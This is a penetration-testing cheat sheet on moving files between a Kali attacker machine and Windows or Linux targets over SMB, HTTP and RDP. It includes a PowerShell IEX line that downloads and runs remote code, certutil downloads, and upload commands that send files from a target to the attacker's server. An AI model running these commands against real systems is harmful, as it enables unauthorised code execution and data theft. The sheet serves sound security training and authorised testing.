# File transfer

## SMB - from Windows to Kali or vice-versa

On Kali start a SMB share server on the folder you want to be shared.

```bash
cd <path>
impacket-smbserver share $(pwd) -smb2support
```

On the target

```cmd
net use \\<Kali IP>\share
net use
copy \\<Kali IP>\share\<file> .
dir
```

KALI to TARGET

```cmd
xcopy \\<Kali IP>\share\<file> C:\<destination_path>\
```

TARGET to KALI

```cmd
xcopy <source_path>\<file> \\<Kali IP>\share\
```

## HTTP - from attacker to target OR target to attacker

Python 2.7

```bash
cd <path>
python -m SimpleHTTPServer 8000
```

or

Python 3

```bash
cd <path>
python3 -m http.server 8000
```

or

PHP

```bash
cd <path>
php -S 0.0.0.0:8000
```

or

Ruby

```bash
cd <path>
ruby -run -ehttpd . -p8000
```

### download to Windows

PowerShell

```powershell
Invoke-WebRequest -Uri 'http://<http server IP>:8000/<filename>' -OutFile <filename> 
```

PowerShell from cmd

```powershell
powershell.exe -command Invoke-WebRequest -Uri http://<http server IP>:8000/<filename> -OutFile <filename>
```

Download and execute with `Invoke-Expression` without saving file

```powershell
powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<http server IP>:8000/<filename>)
```

Certutil

```powershell
certutil -urlcache -split -f 'http://<http server IP>:8000/<filename>' <path_destiny><filename>
```

### upload from Windows

Start HTTP upload server on Kali

```bash
python3 -m uploadserver 9090
```

Load PS lib [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) and execute `Invoke-FileUpload`.

```powershell
Invoke-FileUpload -File C:\Temp\file.txt -Uri http://<HTTP Server IP>:9090/upload
```

### download to Linux

wget

```bash
wget <http server IP>:8000/<filename>
```

Perl oneliner

```bash
perl -MHTTP::Tiny -e '$http = HTTP::Tiny->new; $http->mirror("http://<http server IP>:8181/file.txt", "file.txt");'
```

### upload from Linux

Start HTTP upload server on Kali

```bash
python3 -m uploadserver 9090
```

```bash
curl -X POST http://<HTTP Server IP>:9090/upload -F 'files=@<filename1>' -F 'files=@<filename2>'
```

## RDP - tsclient

### attacker to/from Windows

Use rdesktop or xfreerdp to connect to Windows target mapping a attacker host local folder to tsclient - [examples](windowsRemoteDesktop.md)

On the Windows target with CMD or PowerShell you can list the directory with `dir \\tsclient\sharedfolder`.

```powershell
PS C:\> dir \\tsclient\kali

    Directory: \\tsclient\kali

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/19/2021   1:14 PM              0 file_01.txt
-a----        6/18/2021  12:23 PM             36 file_02.txt
```

```powershell
PS C:\> mkdir C:\Temp
PS C:\> copy \\tsclient\kali\Tools.zip C:\Temp
PS C:\> Expand-Archive -LiteralPath C:\Temp\Tools.zip -DestinationPath C:\Temp
```

```powershell
PS C:\> dir C:\Temp\

    Directory: C:\Temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/18/2023   3:03 PM                Tools
-a----       11/18/2023   2:59 PM       12711723 Tools.zip
```

## Links

- [file transfer cheatsheet Windows and Linux](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
- [nfinitelogins - windows-file-transfer-cheatsheet/](https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/)
- [certcube - file-transfer-cheatsheet-for-pentesters](https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/)
- [fir3wa1-k3r - File-Transfer-cheatsheet](https://fir3wa1-k3r.github.io/2018/10/17/File-Transfer-cheatsheet.html)
